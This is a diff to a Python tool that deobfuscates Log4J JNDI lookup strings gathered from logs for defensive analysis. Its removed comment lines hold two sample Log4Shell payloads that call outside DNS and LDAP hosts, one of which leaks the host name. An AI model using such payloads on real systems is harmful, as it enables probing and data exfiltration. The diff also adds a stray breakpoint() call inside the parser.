@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 
-# pylint: disable=line-too-long
+# pylint: disable=line-too-long,broad-except
 
+import base64
 import datetime
 import json
 import os
@@ -19,32 +20,35 @@ JNDIParts = namedtuple(
 
 def parse_jndi_proto_and_path(jndi: str) -> Tuple[str, str, str, str]:
     """Split JNDI string into components. No error checking..."""
-    # jndi:dns://45.83.64.1/securityscan-mqz6vcflt3ekussg
-    # jndi:ldap://${hostName}.c6rr05cpu892m69lgpo0cg55uyyy4pczq.interact.sh
+
     try:
         colon_split = jndi.split(":")
         protocol: str = colon_split[1]
         slash_split: List[str] = jndi.split("/")
         host_port = slash_split[2]
-        path: str = (
-            "" if len(slash_split) < 4 else slash_split[3]
-        )  # No trailing / after host.
+        path: str = "" if len(slash_split) < 4 else "/".join(slash_split[3:])
+
+        breakpoint()
         host, _, port_maybe = host_port.partition(":")
         return protocol, host, port_maybe, path
-    except:
-        print(f"Fault: {jndi}")
+    except Exception as exc:
+        print(f"Failed to extract JNDI parts from '{jndi}': {exc}")
         return "", "", "", ""
 
 
 def repl_func(matchobj, group_selector: str) -> str:
     """Pick replacement from match object."""
+
     if matchobj.group(0) != "":
         return matchobj.group(group_selector)
     return ""
 
 
 def replace_lookups(pre: str, partition: str, active: str) -> JNDIParts:
-    """Replace Log4J lookups."""
+    """Replace Log4J lookups.
+    See https://logging.apache.org/log4j/2.x/manual/lookups.html and
+    https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution
+    """
 
     original: str = f"{pre}${partition}{active}"
     protocol: str = ""
@@ -52,9 +56,6 @@ def replace_lookups(pre: str, partition: str, active: str) -> JNDIParts:
     port: str = ""
     path: str = ""
 
-    # See https://logging.apache.org/log4j/2.x/manual/lookups.html
-    # and
-    # https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution
     lookups = {
         "default_value_lookup": (
             re.compile(r"\${(?P<type>[^:]*):(?P<key>[^:]*):-(?P<val>[^}]*)}"),
@@ -135,7 +136,7 @@ def parse_jndi_sample(orig_jndi_sample: str) -> JNDIParts:
 
 
 def deobfuscate_jndi(jndi_sample_path: str) -> None:
-    """Read samples and try to deobfuscate them. Store back in iinput file."""
+    """Read samples and try to deobfuscate them. Store back in input file."""
 
     with open(jndi_sample_path, "rt", encoding="UTF-8") as f_json:
         samples = json.load(f_json)
@@ -195,7 +196,7 @@ def performace_test(samples: str) -> None:
     with open(samples, "rt", encoding="UTF-8") as f_in:
         lines = f_in.readlines()
     t_start = datetime.datetime.now()
-    for (count, line) in enumerate(lines):
+    for line in lines:
         _ = parse_jndi_sample(line)
     t_stop = datetime.datetime.now()
     t_delta = t_stop - t_start
@@ -206,8 +207,8 @@ def performace_test(samples: str) -> None:
 def main() -> None:
     """De-obfuscate JNDI strings."""
 
-    # kibana_input_file = "from_kibana.txt"
-    # jndi_samples_file = "jndi_samples.json"
+    kibana_input_file = "from_kibana.txt"
+    jndi_samples_file = "jndi_samples.json"
 
     if not os.path.isfile(jndi_samples_file):
         make_jndi_samples_file(kibana_input_file, jndi_samples_file)
